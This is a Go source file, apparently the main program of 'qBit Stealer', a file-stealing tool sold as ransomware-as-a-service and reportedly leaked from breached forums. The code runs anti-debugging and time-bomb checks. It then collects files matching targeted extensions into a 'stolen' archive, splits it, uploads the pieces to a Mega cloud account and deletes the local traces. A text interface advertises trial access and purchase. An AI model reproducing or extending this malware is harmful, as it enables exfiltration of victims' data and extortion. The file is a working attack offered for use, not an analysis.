/*
Telegram: https://t.me/n1k7l4i
Open Sourced by n1k7 from breached forums, program is not for sale anymore.
Don't sell this product as everyone deserves to use it for free as they like.
~ peace out.
*/

package main

import (
	"flag"
	"fmt"
	"github.com/gizak/termui/v3"
	"github.com/gizak/termui/v3/widgets"
	"log"
	"os"
	"sync"
	"time"
)

func main() {
	// initial safety checks
	//hardcodedGUID := "77a1dfc4-9949-4e4a-a02c-4b923b75682d"
	//machineGUID, _ := HostID()
	//hardcodedGUID = strings.TrimSpace(hardcodedGUID)
	//machineGUID = strings.TrimSpace(machineGUID)
	//if machineGUID != hardcodedGUID {
	//os.Exit(1)
	//}
	Check()
	Beingdebuggedpeb()
	_NtQueryInformationProcess()
	hardcodedTime, _ := time.Parse("2006/01/02-15:04:05", "2023/11/14-12:00:00")
	go checkTime(hardcodedTime, true) // false to turn off time check, vice versa

	// complete code execution from here
	configPath := flag.String("config", "config.json", "Path to the configuration file")
	debug := flag.Bool("debug", false, "Enable debug mode, provides much more console information")
	flag.Parse()

	if logFlag {
		fmt.Println("[+] Starting program")
	}
	err := loadConfig(*configPath)
	if err != nil {
		fmt.Println("[-] Failed to load configJs!")
		os.Exit(1)
	}
	if logFlag {
		fmt.Println("[+] Loaded configJs")
	}
	if *debug {
		fmt.Println("[DEBUG] Debug mode enabled")
	}
	err = termui.Init()
	if err != nil {
		fmt.Println("[-] Failed to initialize termui:", err)
		log.Fatal(err)
	}
	defer termui.Close()
	if logFlag {
		fmt.Println("[+] Initialized termui")
	}

	p := widgets.NewParagraph()
	p.Title = "Config"

	p.Text = fmt.Sprintf("Path: %s\nStolen Folder Name: %s\nMax File Size(MB): %d\nSplit Size: %d\nTargeted File Extensions: %v\nAPI: %s\nMode: %s", configJs.Path, configJs.StolenFolderName, configJs.MaxFileSizeMB, configJs.SplitSize, configJs.TargetedFileExtensions, apiStatus, configJs.Mode)

	options := newOptionBox()
	logBox := newLogConsoleBox()
	logBox.Title = "Log"
	logBox.Text = ""
	grid := termui.NewGrid()

	grid.Set(
		termui.NewRow(3.0/5,
			termui.NewCol(2.0/3,
				termui.NewRow(1.7/3, p),
				termui.NewRow(2.5/3, logBox),
			),
			termui.NewCol(1.0/6,
				termui.NewRow(0.6/2, newOptionBox()),
				termui.NewRow(1.3/2, ContactBox()),
			),
		),
	)

	if configJs.Mode == "AUTO" {
		begin()
		addLogEntry(logBox, "[+] Please wait, files are being uploaded... WORKING!\n")
		termui.Render(grid)
		if configJs.Mode == "AUTO" {
			files, err := getFiles([]string{configJs.Path}, configJs.MaxFileSizeMB, configJs.TargetedFileExtensions)
			if err != nil {
				addLogEntry(logBox, "[-] Failed to get files: "+err.Error())
			}
			if len(files) == 0 {
				addLogEntry(logBox, "[!] No files matched the specified extensions.")
			} else {
				zipPath, err := archiveFiles(files)
				if err != nil {
					if logFlag {
						fmt.Println("[-] Failed to archive files:", err)
					}
				}
				zipInfo, err := os.Stat(zipPath)
				if err != nil {
					if logFlag {
						fmt.Println("[-] Failed to get file info:", err)
					}
				}
				zipSizeMB := zipInfo.Size() / 1024 / 1024
				if zipSizeMB > int64(configJs.MaxFileSizeMB) {
					splitFiles, err := splitFile(zipPath, int64(configJs.SplitSize*1024*1024))
					if err != nil {
						if logFlag {
							fmt.Println("[-] Failed to split file:", err)
						}
					}
					var wg sync.WaitGroup
					for _, file := range splitFiles {
						wg.Add(1)
						go func(file string) {
							err = uploadFile(file, logBox)
							if err != nil {
								if logFlag {
									fmt.Println("[-] Failed to upload file:", file)
								}
							}
						}(file)
					}
					wg.Wait()
				} else {
					for _, file := range files {
						err = uploadFile(file, logBox)
						if err != nil {
							addLogEntry(logBox, "[-] Failed to upload file: "+file)
						}
					}
				}
				if logFlag {
					fmt.Println("[+] Started automatic file upload")
				}
			}
		}
	}

	if logFlag {
		fmt.Println("[+] Called begin function")
	}
	updateParagraph(p)
	eventLoop(grid, p, options, logBox)
	if logFlag {
		fmt.Println("[+] Exiting program...")
	}
}

func ContactBox() *widgets.Paragraph {
	p := widgets.NewParagraph()
	p.Title = "Information"
	// Premium information
	p.Text = "Contact: \nqBit Stealer RaaS \n(qbit@hitler.rocks)\n"
	// Trial information
	p.Text = "Contact: \nqBit Stealer RaaS \n(qbit@hitler.rocks)\n\nTRIAL VERSION - 24 Hour Access \n\nEmail us to Purchase!"
	p.TextStyle.Fg = termui.ColorRed
	return p
}

func eventLoop(grid *termui.Grid, p *widgets.Paragraph, options *widgets.List, logBox *widgets.Paragraph) {
	begin()
	uiEvents := termui.PollEvents()
	ticker := time.NewTicker(300 * time.Millisecond)
	configPath := "./configJs.json"
	for {
		select {
		case e := <-uiEvents:
			switch e.ID {
			case "q", "<C-c>":
				return
			case "<Resize>":
				payload := e.Payload.(termui.Resize)
				grid.SetRect(0, 0, payload.Width, payload.Height)
				updateParagraph(p)
				termui.Render(grid)
			case "b": // Use 'b' for BEGIN
				addLogEntry(logBox, "[+] Please wait, files are being uploaded... WORKING!")
				termui.Render(grid)
				grid.Set(
					termui.NewRow(3.0/5,
						termui.NewCol(2.0/3,
							termui.NewRow(1.7/3, p),
							termui.NewRow(2.5/3, logBox),
						),
						termui.NewCol(1.0/6,
							termui.NewRow(0.6/2, newOptionBox()),
							termui.NewRow(1.3/2, ContactBox()),
						),
					),
				)
				options.SelectedRow = 0
				termui.Render(options)
				files, err := getFiles([]string{configJs.Path}, configJs.MaxFileSizeMB, configJs.TargetedFileExtensions)
				if err != nil {
					addLogEntry(logBox, "[-] Failed to get files: "+err.Error())
				}
				if len(files) == 0 {
					addLogEntry(logBox, "[!] No files matched the specified extensions.")
				} else {
					zipPath, err := archiveFiles(files)
					if err != nil {
						addLogEntry(logBox, "[-] Failed to archive files: "+err.Error())
					}
					zipInfo, err := os.Stat(zipPath)
					if err != nil {
						addLogEntry(logBox, "[-] Failed to get file info: "+err.Error())
					}
					zipSizeMB := zipInfo.Size() / 1024 / 1024
					if zipSizeMB > int64(configJs.MaxFileSizeMB) {
						splitFiles, err := splitFile(zipPath, int64(configJs.SplitSize*1024*1024))
						if err != nil {
							addLogEntry(logBox, "[-] Failed to split file: "+err.Error())
						}
						var wg sync.WaitGroup
						for _, file := range splitFiles {
							wg.Add(1)
							go func(file string) {
								err = uploadFile(file, logBox)
								if err != nil {
									addLogEntry(logBox, "[-] Failed to upload file: "+file)
								}
							}(file)
						}
						wg.Wait()
						time.AfterFunc(15*time.Second, func() {
							err := os.Remove(zipPath)
							if err != nil {
								addLogEntry(logBox, "[-] Failed to delete archive file: "+err.Error())
							} else {
								addLogEntry(logBox, "[+] Clean up of Left over Archived files completed with no errors.")
							}
						})
					} else {
						err = uploadFile(zipPath, logBox)
						if err != nil {
							addLogEntry(logBox, "[-] Failed to upload file: "+zipPath)
						}
					}
				}
			case "r": // Use 'r' for RELOAD CONFIG
				addLogEntry(logBox, "[+] Please wait, reloading configJs...")
				termui.Render(grid)
				m := mNew()
				err := m.Login(configJs.API.ID, configJs.API.Password)
				if err != nil {
					apiStatus = "BAD LOGIN!"
					log.Fatal(err)
				} else {
					apiStatus = "OK!"
				}
				if logFlag {
					fmt.Println("[+] Logged into Mega...")
				}
				err = loadConfig(configPath)
				if err != nil {
					addLogEntry(logBox, "[-] Failed to reload configJs: "+err.Error())
				} else {
					addLogEntry(logBox, "[+] Reloaded configJs..")
				}
				updateParagraph(p)
				options.SelectedRow = 1
				termui.Render(options)
			case "e": // Use 'e' for Exit
				addLogEntry(logBox, "[+] Exit initiated.\n")
				options.SelectedRow = 2
				termui.Render(options)
				time.Sleep(200 * time.Millisecond)
				os.Exit(0)
			default:
				continue
			}
			termui.Render(grid)
		case <-ticker.C:
			updateParagraph(p)
			width, height := termui.TerminalDimensions()
			grid.SetRect(0, 0, width, height)
			termui.Render(grid)
		default:
			continue
		}
	}
}
